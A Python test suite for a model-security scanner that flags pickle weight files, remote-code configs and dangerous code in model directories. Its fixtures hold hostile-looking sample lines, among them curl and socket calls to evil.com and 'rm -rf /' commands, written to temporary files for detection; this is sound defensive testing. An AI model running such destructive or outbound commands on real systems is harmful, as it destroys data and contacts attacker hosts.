#!/usr/bin/env python3
"""
Comprehensive tests for model-security module.

Tests the ModelSecurityScanner, CLI interface, and all scanner components.
"""

import sys
import os
import tempfile
import json
import subprocess
from pathlib import Path

# Add model-security to path
PLATFORM_SECURITY_DIR = Path(__file__).parent / "platform-security"
MODEL_SECURITY_DIR = PLATFORM_SECURITY_DIR / "model-security"
sys.path.insert(0, str(MODEL_SECURITY_DIR))

from scanner import ModelSecurityScanner, ScanResult, Finding, Severity, main


def test_scanner_initialization():
    """Test scanner can be initialized"""
    print("Test: Scanner initialization... ", end="")
    scanner = ModelSecurityScanner()
    assert scanner is not None
    assert scanner.strict_mode == True
    assert scanner.allow_pickle == False
    print("✓")


def test_scanner_initialization_with_options():
    """Test scanner with custom options"""
    print("Test: Scanner with custom options... ", end="")
    scanner = ModelSecurityScanner(strict_mode=False, allow_pickle=True)
    assert scanner.strict_mode == False
    assert scanner.allow_pickle == True
    print("✓")


def test_scanner_with_safe_model():
    """Test scanning a directory with safe files"""
    print("Test: Scan safe model directory... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a fake safe model directory
        config = {
            "model_type": "llama",
            "hidden_size": 4096
        }
        with open(os.path.join(tmpdir, "config.json"), "w") as f:
            json.dump(config, f)
        
        # Create a dummy safetensors file (empty, but correct extension)
        Path(os.path.join(tmpdir, "model.safetensors")).touch()
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        assert result.passed == True, f"Expected pass, got findings: {[f.message for f in result.findings]}"
        assert "FormatChecker" in result.scanners_run
    
    print("✓")


def test_scanner_blocks_pickle():
    """Test scanner blocks pickle files"""
    print("Test: Block pickle files... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a .pt file (pickle-based, should be blocked)
        Path(os.path.join(tmpdir, "model.pt")).touch()
        
        scanner = ModelSecurityScanner(allow_pickle=False)
        result = scanner.scan_model(tmpdir)
        
        assert result.passed == False, "Expected fail for pickle file"
        assert any(f.category == "BLOCKED_FORMAT" for f in result.findings)
    
    print("✓")


def test_scanner_blocks_bin_files():
    """Test scanner blocks .bin files"""
    print("Test: Block .bin files... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(os.path.join(tmpdir, "pytorch_model.bin")).touch()
        
        scanner = ModelSecurityScanner(allow_pickle=False)
        result = scanner.scan_model(tmpdir)
        
        assert result.passed == False, "Expected fail for .bin file"
        assert any(f.category == "BLOCKED_FORMAT" for f in result.findings)
    
    print("✓")


def test_scanner_blocks_pkl_files():
    """Test scanner blocks .pkl files"""
    print("Test: Block .pkl files... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(os.path.join(tmpdir, "weights.pkl")).touch()
        
        scanner = ModelSecurityScanner(allow_pickle=False)
        result = scanner.scan_model(tmpdir)
        
        assert result.passed == False, "Expected fail for .pkl file"
        assert any(f.category == "BLOCKED_FORMAT" for f in result.findings)
    
    print("✓")


def test_scanner_allows_pickle_when_enabled():
    """Test scanner allows pickle when allow_pickle=True"""
    print("Test: Allow pickle when enabled... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(os.path.join(tmpdir, "model.pt")).touch()
        
        scanner = ModelSecurityScanner(allow_pickle=True)
        result = scanner.scan_model(tmpdir)
        
        # Should not have CRITICAL findings, but may have MEDIUM warning
        critical_findings = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) == 0, "Should not have critical findings when pickle allowed"
    
    print("✓")


def test_scanner_detects_dangerous_code():
    """Test scanner detects dangerous patterns in Python files"""
    print("Test: Detect dangerous code patterns... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a Python file with dangerous pattern
        malicious_code = '''
import os
import subprocess

def backdoor():
    subprocess.run(["curl", "http://evil.com"])
'''
        with open(os.path.join(tmpdir, "modeling.py"), "w") as f:
            f.write(malicious_code)
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        assert result.passed == False, "Expected fail for dangerous code"
        assert any(f.category in ["SUBPROCESS", "NETWORK_HTTP"] for f in result.findings)
    
    print("✓")


def test_scanner_detects_network_socket():
    """Test scanner detects socket usage"""
    print("Test: Detect socket usage... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        code = '''
import socket
sock = socket.socket()
sock.connect(("evil.com", 80))
'''
        with open(os.path.join(tmpdir, "model.py"), "w") as f:
            f.write(code)
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        assert any(f.category == "NETWORK_SOCKET" for f in result.findings)
    
    print("✓")


def test_scanner_detects_eval_exec():
    """Test scanner detects eval/exec"""
    print("Test: Detect eval/exec... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        code = '''
user_input = "os.system('rm -rf /')"
eval(user_input)
'''
        with open(os.path.join(tmpdir, "model.py"), "w") as f:
            f.write(code)
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        assert any(f.category == "DYNAMIC_EXEC" for f in result.findings)
    
    print("✓")


def test_scanner_detects_os_system():
    """Test scanner detects os.system calls"""
    print("Test: Detect os.system... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        code = '''
import os
os.system("whoami")
'''
        with open(os.path.join(tmpdir, "model.py"), "w") as f:
            f.write(code)
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        assert any(f.category == "OS_SYSTEM" for f in result.findings)
    
    print("✓")


def test_scanner_detects_trust_remote_code():
    """Test scanner detects auto_map requiring trust_remote_code"""
    print("Test: Detect trust_remote_code requirement... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        config = {
            "model_type": "custom",
            "auto_map": {
                "AutoModelForCausalLM": "modeling_custom.CustomModel"
            }
        }
        with open(os.path.join(tmpdir, "config.json"), "w") as f:
            json.dump(config, f)
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        assert any(f.category == "TRUST_REMOTE_CODE_REQUIRED" for f in result.findings)
    
    print("✓")


def test_scanner_skip_code_scan():
    """Test scanner can skip code scanning"""
    print("Test: Skip code scan option... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # This would normally trigger code scan findings
        code = '''
import subprocess
subprocess.run(["curl", "http://evil.com"])
'''
        with open(os.path.join(tmpdir, "model.py"), "w") as f:
            f.write(code)
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir, include_code_scan=False)
        
        # Should not have code pattern findings since we skipped it
        assert "CodePatternScanner" not in result.scanners_run
    
    print("✓")


def test_scanner_json_output():
    """Test scanner produces valid JSON output"""
    print("Test: JSON output format... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(os.path.join(tmpdir, "model.safetensors")).touch()
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        json_str = result.to_json()
        parsed = json.loads(json_str)
        
        assert "passed" in parsed
        assert "findings" in parsed
        assert "scanners_run" in parsed
        assert "model_path" in parsed
        assert "summary" in parsed
    
    print("✓")


def test_scanner_dict_output():
    """Test scanner produces valid dict output"""
    print("Test: Dict output format... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(os.path.join(tmpdir, "model.safetensors")).touch()
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        d = result.to_dict()
        
        assert isinstance(d, dict)
        assert "passed" in d
        assert "summary" in d
        assert "total_findings" in d["summary"]
    
    print("✓")


def test_severity_levels():
    """Test severity enumeration"""
    print("Test: Severity levels... ", end="")
    
    assert Severity.CRITICAL.value == "CRITICAL"
    assert Severity.HIGH.value == "HIGH"
    assert Severity.MEDIUM.value == "MEDIUM"
    assert Severity.LOW.value == "LOW"
    assert Severity.INFO.value == "INFO"
    
    print("✓")


def test_finding_creation():
    """Test Finding dataclass"""
    print("Test: Finding creation... ", end="")
    
    finding = Finding(
        scanner="TestScanner",
        severity=Severity.HIGH,
        category="TEST_CATEGORY",
        message="Test message",
        file="/path/to/file.py",
        line=42
    )
    
    assert finding.scanner == "TestScanner"
    assert finding.severity == Severity.HIGH
    assert finding.category == "TEST_CATEGORY"
    assert finding.file == "/path/to/file.py"
    assert finding.line == 42
    
    d = finding.to_dict()
    assert isinstance(d, dict)
    assert d["severity"] == "HIGH"
    
    print("✓")


def test_scan_result_add_finding():
    """Test ScanResult.add_finding"""
    print("Test: ScanResult add_finding... ", end="")
    
    result = ScanResult(model_path="/test")
    
    result.add_finding(Finding(
        scanner="Test",
        severity=Severity.CRITICAL,
        category="TEST",
        message="Test"
    ))
    
    assert len(result.findings) == 1
    assert result.passed == False  # Critical finding should fail
    
    print("✓")


def test_scanner_file_hashes():
    """Test scanner computes file hashes"""
    print("Test: File hash computation... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a file with known content
        content = b"test content for hashing"
        filepath = os.path.join(tmpdir, "model.safetensors")
        with open(filepath, "wb") as f:
            f.write(content)
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        assert "model.safetensors" in result.file_hashes
        assert len(result.file_hashes["model.safetensors"]) == 64  # SHA256 hex length
    
    print("✓")


def test_cli_as_script():
    """Test scanner.py can be run as a script"""
    print("Test: CLI script execution... ", end="")
    
    scanner_path = MODEL_SECURITY_DIR / "scanner.py"
    
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(os.path.join(tmpdir, "model.safetensors")).touch()
        
        result = subprocess.run(
            [sys.executable, str(scanner_path), tmpdir, "--quiet"],
            capture_output=True,
            text=True
        )
        
        assert result.returncode == 0, f"CLI failed: {result.stderr}"
    
    print("✓")


def test_cli_with_output_file():
    """Test CLI with JSON output file"""
    print("Test: CLI with output file... ", end="")
    
    scanner_path = MODEL_SECURITY_DIR / "scanner.py"
    
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(os.path.join(tmpdir, "model.safetensors")).touch()
        output_file = os.path.join(tmpdir, "result.json")
        
        result = subprocess.run(
            [sys.executable, str(scanner_path), tmpdir, "--output", output_file],
            capture_output=True,
            text=True
        )
        
        assert result.returncode == 0, f"CLI failed: {result.stderr}"
        assert os.path.exists(output_file), "Output file not created"
        
        with open(output_file) as f:
            data = json.load(f)
        assert "passed" in data
    
    print("✓")


def test_cli_detects_failure():
    """Test CLI returns non-zero exit code on scan failure"""
    print("Test: CLI exit code on failure... ", end="")
    
    scanner_path = MODEL_SECURITY_DIR / "scanner.py"
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a blocked file
        Path(os.path.join(tmpdir, "model.pt")).touch()
        
        result = subprocess.run(
            [sys.executable, str(scanner_path), tmpdir, "--quiet"],
            capture_output=True,
            text=True
        )
        
        assert result.returncode == 1, f"Expected exit code 1 for failed scan, got {result.returncode}"
    
    print("✓")


def test_cli_allow_pickle_flag():
    """Test CLI --allow-pickle flag"""
    print("Test: CLI --allow-pickle flag... ", end="")
    
    scanner_path = MODEL_SECURITY_DIR / "scanner.py"
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a .pt file
        Path(os.path.join(tmpdir, "model.pt")).touch()
        
        result = subprocess.run(
            [sys.executable, str(scanner_path), tmpdir, "--allow-pickle", "--quiet"],
            capture_output=True,
            text=True
        )
        
        # With --allow-pickle, the scan should pass (no critical findings)
        assert result.returncode == 0, f"Expected pass with --allow-pickle, got: {result.stderr}"
    
    print("✓")


def test_cli_no_code_scan_flag():
    """Test CLI --no-code-scan flag"""
    print("Test: CLI --no-code-scan flag... ", end="")
    
    scanner_path = MODEL_SECURITY_DIR / "scanner.py"
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create malicious code that would fail
        code = 'import subprocess; subprocess.run(["rm", "-rf", "/"])'
        with open(os.path.join(tmpdir, "model.py"), "w") as f:
            f.write(code)
        
        # Without --no-code-scan, should fail
        result1 = subprocess.run(
            [sys.executable, str(scanner_path), tmpdir, "--quiet"],
            capture_output=True,
            text=True
        )
        
        # With --no-code-scan, should pass (no code analysis)
        result2 = subprocess.run(
            [sys.executable, str(scanner_path), tmpdir, "--no-code-scan", "--quiet"],
            capture_output=True,
            text=True
        )
        
        assert result1.returncode == 1, "Should fail without --no-code-scan"
        assert result2.returncode == 0, "Should pass with --no-code-scan"
    
    print("✓")


def test_scan_single_file():
    """Test scanning a single file instead of directory"""
    print("Test: Scan single file... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        filepath = os.path.join(tmpdir, "model.safetensors")
        Path(filepath).touch()
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(filepath)  # Pass file, not directory
        
        assert result.passed == True
    
    print("✓")


def test_empty_directory():
    """Test scanning an empty directory"""
    print("Test: Scan empty directory... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        # Empty directory should pass (no dangerous files)
        assert result.passed == True
    
    print("✓")


def test_duration_tracking():
    """Test scan duration is tracked"""
    print("Test: Duration tracking... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(os.path.join(tmpdir, "model.safetensors")).touch()
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        assert result.duration_seconds > 0
        assert result.duration_seconds < 60  # Should be fast for empty file
    
    print("✓")


def run_all_tests():
    """Run all tests"""
    print("=" * 60)
    print("Model Security Module - Comprehensive Tests")
    print("=" * 60)
    print()
    
    tests = [
        # Initialization tests
        test_scanner_initialization,
        test_scanner_initialization_with_options,
        
        # Safe model tests
        test_scanner_with_safe_model,
        test_scan_single_file,
        test_empty_directory,
        
        # Blocked format tests
        test_scanner_blocks_pickle,
        test_scanner_blocks_bin_files,
        test_scanner_blocks_pkl_files,
        test_scanner_allows_pickle_when_enabled,
        
        # Code pattern detection tests
        test_scanner_detects_dangerous_code,
        test_scanner_detects_network_socket,
        test_scanner_detects_eval_exec,
        test_scanner_detects_os_system,
        test_scanner_detects_trust_remote_code,
        test_scanner_skip_code_scan,
        
        # Output format tests
        test_scanner_json_output,
        test_scanner_dict_output,
        test_scanner_file_hashes,
        test_duration_tracking,
        
        # Data class tests
        test_severity_levels,
        test_finding_creation,
        test_scan_result_add_finding,
        
        # CLI tests
        test_cli_as_script,
        test_cli_with_output_file,
        test_cli_detects_failure,
        test_cli_allow_pickle_flag,
        test_cli_no_code_scan_flag,
    ]
    
    passed = 0
    failed = 0
    
    for test in tests:
        try:
            test()
            passed += 1
        except AssertionError as e:
            print(f"✗ FAILED: {e}")
            failed += 1
        except Exception as e:
            print(f"✗ ERROR: {type(e).__name__}: {e}")
            failed += 1
    
    print()
    print("=" * 60)
    print(f"Results: {passed} passed, {failed} failed")
    print("=" * 60)
    
    return failed == 0


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
